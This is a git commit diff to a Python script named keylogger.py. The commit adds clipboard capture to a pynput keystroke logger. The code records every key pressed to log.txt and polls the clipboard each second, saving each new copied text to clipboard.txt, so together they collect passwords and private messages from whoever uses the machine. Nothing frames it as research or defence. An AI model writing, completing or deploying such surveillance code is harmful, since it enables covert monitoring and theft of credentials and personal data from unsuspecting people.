3d7f36bd036fee886884b0808f884ad41373fde0
Enerinn <shizuto23231@icloud.com>
2024-05-13 16:54:55 -0400

    Implemented clipboard capture

--- keylogger.py
+++ keylogger.py
@@ -1,16 +1,17 @@
+from time import sleep
 from pynput import keyboard
 from richxerox import *
+import re
 import os
 
 log_file = open("log.txt", "w")
 clipboard_file = open("clipboard.txt", "w")
-
 def on_press(key):
     try:
         if key == keyboard.Key.space:
             log_file.write(" ")
         elif key == keyboard.Key.backspace:
-            log_file.seek(0, os.SEEK_END) # Move the cursor to the end of the file
+            log_file.seek(0, os.SEEK_END) # Move the cursor to the end of the log_file
             pos = log_file.tell() # Get the current position of the cursor
             if pos > 0:
                 log_file.seek(pos - 1)
@@ -25,11 +26,16 @@ def on_press(key):
 def on_release(key):
     if key == keyboard.Key.esc:
         return False
-    
+
 listener = keyboard.Listener(on_press=on_press, on_release=on_release)
 listener.start()
 
-
-text = paste(format = "text")
-print(f'"text": {text}')
-    
+text = None
+while (listener.is_alive()):
+    sleep(1)
+    if (text == paste(format='text')):
+        continue
+    text = paste(format='text')
+    clipboard_file.write(text+"\n")
+log_file.close()
+clipboard_file.close()
